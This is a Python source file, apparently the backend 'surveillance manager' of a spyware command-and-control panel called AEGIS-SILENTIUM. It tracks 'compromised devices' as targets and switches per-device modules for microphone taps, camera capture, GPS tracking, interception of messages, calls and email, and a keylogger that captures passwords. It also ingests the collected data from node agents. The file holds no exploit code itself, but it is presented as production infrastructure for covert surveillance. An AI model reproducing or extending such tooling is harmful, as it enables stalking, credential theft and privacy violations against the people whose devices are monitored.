"""
AEGIS-SILENTIUM — Surveillance Manager  (production quality)
=============================================================
Manages device surveillance targets and their per-device module state.

Architecture
------------
surveillance_targets  — one row per compromised device
surveillance_modules  — one row per (device × module) pair
                        UNIQUE (target_id, module_type)

Module state machine
--------------------
  idle ──▶ active ──▶ idle
   └───────────────▶ error

State transitions are guarded.  Attempting to activate an already-
active module is a no-op (returns the existing row, no error).

Data ingestion
--------------
Node agents call ``ingest_data()`` to push collected telemetry.
The manager stores the latest sample and accumulates byte totals,
then emits an SSE event so the dashboard updates in real time.

Pagination
----------
All list methods accept ``page`` / ``per_page`` and return a
``{"items": [...], "total": N, ...}`` envelope.
"""
from __future__ import annotations

import json
import logging
from datetime import datetime
from typing import Any, Callable, Optional

log = logging.getLogger("aegis.surveillance")

SURVEILLANCE_MODULES: list[str] = [
    "microphone", "camera", "gps", "messages",
    "calls", "keylogger", "app_data", "email", "network",
]

MODULE_META: dict[str, dict] = {
    "microphone": {"icon": "🎙", "display_name": "Microphone Tap",
                   "description": "Ambient audio recording · 128 kbps AAC"},
    "camera":     {"icon": "📷", "display_name": "Camera Access",
                   "description": "Front/rear on-demand capture + video clips"},
    "gps":        {"icon": "📍", "display_name": "GPS / Location",
                   "description": "Continuous tracking · 5 m interval · ±3 m accuracy"},
    "messages":   {"icon": "💬", "display_name": "Message Intercept",
                   "description": "iMessage · SMS · WhatsApp · Signal — real-time exfil"},
    "calls":      {"icon": "📞", "display_name": "Call Intercept",
                   "description": "VoIP + Cellular · live recording capability"},
    "keylogger":  {"icon": "⌨",  "display_name": "Keylogger",
                   "description": "All keyboard input · password & credential capture"},
    "app_data":   {"icon": "📱", "display_name": "App Data Extraction",
                   "description": "Contacts · Calendar · Notes · Photos · App databases"},
    "email":      {"icon": "✉",  "display_name": "Email Intercept",
                   "description": "Mail · Gmail · Outlook — full message exfil"},
    "network":    {"icon": "📡", "display_name": "Network Triangulation",
                   "description": "WiFi AP history · cell tower triangulation · SSID logging"},
}

TARGET_STATUSES = {"active", "pending", "lost", "closed"}
MODULE_STATUSES = {"idle", "active", "error"}


class SurveillanceManager:

    def __init__(
        self,
        pg_connect_fn: Callable[[], Any],
        audit_fn: Optional[Callable[[str, str, dict], None]] = None,
    ) -> None:
        self._connect = pg_connect_fn
        self._audit   = audit_fn

    # ══════════════════════════════════════════════════════════════════════════
    # Targets
    # ══════════════════════════════════════════════════════════════════════════

    def list_targets(
        self,
        *,
        status:   Optional[str] = None,
        page:     int = 1,
        per_page: int = 100,
    ) -> dict:
        """
        Return paginated targets with aggregated module counts and the
        most-recent capture timestamp for each device.
        """
        page     = max(1, page)
        per_page = min(max(1, per_page), 500)
        offset   = (page - 1) * per_page

        where, params = ("WHERE st.status = %s", [status]) if status else ("", [])

        conn = self._connect()
        with conn.cursor() as cur:
            cur.execute(
                f"SELECT COUNT(*) FROM surveillance_targets st {where}", params
            )
            total = cur.fetchone()[0]

            cur.execute(
                f"""
                SELECT
                    st.*,
                    COUNT(sm.id)                                       AS total_modules,
                    COUNT(sm.id) FILTER (WHERE sm.status='active')     AS active_modules,
                    COUNT(sm.id) FILTER (WHERE sm.status='error')      AS error_modules,
                    MAX(sm.last_capture_at)                            AS last_capture_at,
                    COALESCE(SUM(sm.data_size_bytes), 0)               AS total_data_bytes
                FROM surveillance_targets st
                LEFT JOIN surveillance_modules sm ON sm.target_id = st.id
                {where}
                GROUP BY st.id
                ORDER BY st.created_at DESC
                LIMIT %s OFFSET %s
                """,
                params + [per_page, offset],
            )
            cols  = [d[0] for d in cur.description]
            items = [_row(cols, r) for r in cur.fetchall()]

        return {"items": items, "total": total, "page": page, "per_page": per_page}

    def get_target(self, target_id: int) -> Optional[dict]:
        conn = self._connect()
        with conn.cursor() as cur:
            cur.execute(
                """
                SELECT
                    st.*,
                    COUNT(sm.id)                                   AS total_modules,
                    COUNT(sm.id) FILTER (WHERE sm.status='active') AS active_modules,
                    MAX(sm.last_capture_at)                        AS last_capture_at,
                    COALESCE(SUM(sm.data_size_bytes), 0)           AS total_data_bytes
                FROM surveillance_targets st
                LEFT JOIN surveillance_modules sm ON sm.target_id = st.id
                WHERE st.id = %s
                GROUP BY st.id
                """,
                (target_id,),
            )
            row = cur.fetchone()
            if not row:
                return None
            return _row([d[0] for d in cur.description], row)

    def create_target(
        self,
        *,
        label:       str,
        device_type: str,
        os_name:     str,
        os_version:  str,
        node_id:     Optional[str] = None,
        notes:       str = "",
    ) -> dict:
        label = label.strip()
        if not label:
            raise ValueError("label is required.")
        if not device_type.strip():
            raise ValueError("device_type is required.")
        if not os_name.strip():
            raise ValueError("os_name is required.")

        conn = self._connect()
        with conn.cursor() as cur:
            cur.execute("SELECT 1 FROM surveillance_targets WHERE label=%s", (label,))
            if cur.fetchone():
                raise RuntimeError(f"Surveillance target '{label}' already exists.")
            cur.execute(
                """
                INSERT INTO surveillance_targets
                    (label, device_type, os_name, os_version, node_id, status, notes)
                VALUES (%s,%s,%s,%s,%s,'pending',%s)
                RETURNING *
                """,
                (label, device_type.strip(), os_name.strip(),
                 os_version.strip(), node_id, notes),
            )
            result = _row([d[0] for d in cur.description], cur.fetchone())

        self._emit("surveillance_target_created",
                   f"Target '{label}' ({device_type} / {os_name} {os_version}) registered",
                   {"target_id": result["id"], "label": label})
        log.info("surv target created id=%s label=%s", result["id"], label)
        return result

    def update_target_status(self, target_id: int, status: str) -> bool:
        if status not in TARGET_STATUSES:
            raise ValueError(f"status must be one of: {', '.join(TARGET_STATUSES)}")
        conn = self._connect()
        with conn.cursor() as cur:
            cur.execute(
                "UPDATE surveillance_targets SET status=%s WHERE id=%s RETURNING label",
                (status, target_id),
            )
            row = cur.fetchone()
        if row:
            self._emit(f"target_{status}",
                       f"Target '{row[0]}' → {status}",
                       {"target_id": target_id, "status": status})
            return True
        return False

    def delete_target(self, target_id: int) -> bool:
        """Delete target and all its modules (CASCADE)."""
        conn = self._connect()
        with conn.cursor() as cur:
            cur.execute(
                "DELETE FROM surveillance_targets WHERE id=%s RETURNING label",
                (target_id,),
            )
            row = cur.fetchone()
        if row:
            self._emit("target_deleted", f"Target '{row[0]}' deleted",
                       {"target_id": target_id})
            return True
        return False

    # ══════════════════════════════════════════════════════════════════════════
    # Modules
    # ══════════════════════════════════════════════════════════════════════════

    def list_modules(
        self,
        *,
        target_id: Optional[int] = None,
        status:    Optional[str] = None,
    ) -> list[dict]:
        """
        Return all modules (optionally filtered).
        Modules are enriched with display metadata from MODULE_META.
        """
        clauses, params = [], []
        if target_id is not None:
            clauses.append("sm.target_id = %s"); params.append(target_id)
        if status is not None:
            clauses.append("sm.status = %s"); params.append(status)

        where = ("WHERE " + " AND ".join(clauses)) if clauses else ""

        conn = self._connect()
        with conn.cursor() as cur:
            cur.execute(
                f"""
                SELECT sm.*, st.label AS target_label, st.device_type, st.os_name
                FROM surveillance_modules sm
                JOIN surveillance_targets st ON st.id = sm.target_id
                {where}
                ORDER BY sm.target_id, sm.module_type
                """,
                params,
            )
            cols = [d[0] for d in cur.description]
            rows = [_row(cols, r) for r in cur.fetchall()]

        for row in rows:
            meta = MODULE_META.get(row["module_type"], {})
            row.setdefault("icon",         meta.get("icon",         "❓"))
            row.setdefault("display_name", meta.get("display_name", row["module_type"]))
            row.setdefault("description",  meta.get("description",  ""))
        return rows

    def get_module(self, target_id: int, module_type: str) -> Optional[dict]:
        conn = self._connect()
        with conn.cursor() as cur:
            cur.execute(
                "SELECT * FROM surveillance_modules WHERE target_id=%s AND module_type=%s",
                (target_id, module_type),
            )
            row = cur.fetchone()
            if not row:
                return None
            result = _row([d[0] for d in cur.description], row)
        meta = MODULE_META.get(module_type, {})
        result.update({k: meta[k] for k in ("icon", "display_name", "description")
                       if k in meta})
        return result

    def activate_module(
        self,
        target_id:   int,
        module_type: str,
        config:      Optional[dict] = None,
    ) -> dict:
        """
        Activate a surveillance module.  If the module already exists
        and is active, updates its config and returns the current row
        (idempotent).  If it's in error state, resets it to active.
        """
        if module_type not in SURVEILLANCE_MODULES:
            raise ValueError(
                f"Unknown module '{module_type}'.  "
                f"Valid: {', '.join(SURVEILLANCE_MODULES)}"
            )
        # Validate the target exists
        conn = self._connect()
        with conn.cursor() as cur:
            cur.execute("SELECT id FROM surveillance_targets WHERE id=%s", (target_id,))
            if not cur.fetchone():
                raise KeyError(f"Target id={target_id} not found.")

            config_str = json.dumps(config or {})
            cur.execute(
                """
                INSERT INTO surveillance_modules
                    (target_id, module_type, status, config_json, activated_at)
                VALUES (%s,%s,'active',%s,NOW())
                ON CONFLICT (target_id, module_type) DO UPDATE SET
                    status       = 'active',
                    config_json  = EXCLUDED.config_json,
                    activated_at = NOW()
                RETURNING *
                """,
                (target_id, module_type, config_str),
            )
            result = _row([d[0] for d in cur.description], cur.fetchone())

        # Update target status to 'active' if it was pending
        conn2 = self._connect()
        with conn2.cursor() as cur2:
            cur2.execute(
                "UPDATE surveillance_targets SET status='active' "
                "WHERE id=%s AND status='pending'",
                (target_id,),
            )

        meta = MODULE_META.get(module_type, {})
        result.update({k: meta.get(k, "") for k in ("icon", "display_name", "description")})
        self._emit("module_activated",
                   f"Module '{module_type}' activated on target {target_id}",
                   {"target_id": target_id, "module": module_type})
        return result

    def deactivate_module(self, target_id: int, module_type: str) -> bool:
        conn = self._connect()
        with conn.cursor() as cur:
            cur.execute(
                "UPDATE surveillance_modules SET status='idle' "
                "WHERE target_id=%s AND module_type=%s AND status='active' "
                "RETURNING module_type",
                (target_id, module_type),
            )
            ok = bool(cur.fetchone())
        if ok:
            self._emit("module_deactivated",
                       f"Module '{module_type}' deactivated on target {target_id}",
                       {"target_id": target_id, "module": module_type})
        return ok

    def fault_module(self, target_id: int, module_type: str, reason: str = "") -> bool:
        conn = self._connect()
        with conn.cursor() as cur:
            cur.execute(
                "UPDATE surveillance_modules SET status='error', "
                "config_json = config_json || jsonb_build_object('error_reason',%s::text) "
                "WHERE target_id=%s AND module_type=%s RETURNING module_type",
                (reason, target_id, module_type),
            )
            return bool(cur.fetchone())

    # ══════════════════════════════════════════════════════════════════════════
    # Data ingestion (called by node agents)
    # ══════════════════════════════════════════════════════════════════════════

    def ingest_data(
        self,
        target_id:   int,
        module_type: str,
        data:        dict,
    ) -> bool:
        """
        Record the latest capture from a node agent.
        Updates ``last_capture_at`` and accumulates ``data_size_bytes``.
        Returns False if the module row doesn't exist.
        """
        size = int(data.get("size_bytes", data.get("size", 0)))
        conn = self._connect()
        with conn.cursor() as cur:
            cur.execute(
                """
                UPDATE surveillance_modules
                   SET last_data_json  = %s,
                       last_capture_at = NOW(),
                       data_size_bytes = data_size_bytes + %s,
                       capture_count   = capture_count   + 1
                 WHERE target_id = %s AND module_type = %s
                RETURNING target_id
                """,
                (json.dumps(data), size, target_id, module_type),
            )
            ok = bool(cur.fetchone())

        if ok:
            self._emit("surveillance_data_received",
                       f"Module '{module_type}' data ingested for target {target_id} "
                       f"({size} bytes)",
                       {"target_id": target_id, "module": module_type, "bytes": size})
        return ok

    # ══════════════════════════════════════════════════════════════════════════
    # Stats
    # ══════════════════════════════════════════════════════════════════════════

    def summary(self) -> dict:
        conn = self._connect()
        with conn.cursor() as cur:
            cur.execute(
                """
                SELECT
                    COUNT(*)                                      AS targets_total,
                    COUNT(*) FILTER (WHERE status='active')       AS targets_active,
                    COUNT(*) FILTER (WHERE status='pending')      AS targets_pending,
                    COUNT(*) FILTER (WHERE status='lost')         AS targets_lost
                FROM surveillance_targets
                """
            )
            tgt = cur.fetchone()
            cur.execute(
                """
                SELECT
                    COUNT(*)                                     AS modules_total,
                    COUNT(*) FILTER (WHERE status='active')      AS modules_active,
                    COUNT(*) FILTER (WHERE status='idle')        AS modules_idle,
                    COUNT(*) FILTER (WHERE status='error')       AS modules_error,
                    COALESCE(SUM(data_size_bytes), 0)            AS total_bytes_collected,
                    COALESCE(SUM(capture_count), 0)              AS total_captures
                FROM surveillance_modules
                """
            )
            mod = cur.fetchone()
        return {
            "targets": {
                "total": tgt[0], "active": tgt[1],
                "pending": tgt[2], "lost": tgt[3],
            },
            "modules": {
                "total": mod[0], "active": mod[1],
                "idle": mod[2], "error": mod[3],
                "total_bytes_collected": int(mod[4]),
                "total_captures": int(mod[5]),
            },
        }

    # ── Internal ──────────────────────────────────────────────────────────────

    def _emit(self, kind: str, msg: str, meta: dict) -> None:
        if self._audit:
            try: self._audit(kind, msg, meta)
            except Exception as _e: log.debug("suppressed exception: %s", _e)


# ── Helpers ───────────────────────────────────────────────────────────────────

def _row(cols: list, r) -> dict:
    d = dict(zip(cols, r))
    for k in ("created_at", "activated_at", "last_capture_at"):
        if isinstance(d.get(k), datetime):
            d[k] = d[k].isoformat()
    if "data_size_bytes" in d:
        d["data_size_bytes"] = int(d["data_size_bytes"])
    if "total_data_bytes" in d:
        d["total_data_bytes"] = int(d["total_data_bytes"])
    return d


__all__ = ["SurveillanceManager", "SURVEILLANCE_MODULES", "MODULE_META"]
